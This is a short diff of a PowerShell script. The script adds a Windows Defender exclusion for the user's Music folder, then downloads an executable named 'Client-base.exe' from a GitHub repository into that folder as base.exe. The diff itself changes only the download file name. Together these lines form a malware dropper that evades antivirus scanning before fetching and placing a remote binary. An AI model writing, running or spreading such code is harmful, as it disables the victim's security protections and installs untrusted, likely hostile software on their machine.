@@ -1,5 +1,5 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE\Music
-  $url = 'https://github.com/andresberejno/aaaaaaa/raw/refs/heads/main/Client-built.exe'
+  $url = 'https://github.com/andresberejno/aaaaaaa/raw/refs/heads/main/Client-base.exe'
 $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Music', 'base.exe')
 
 # Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
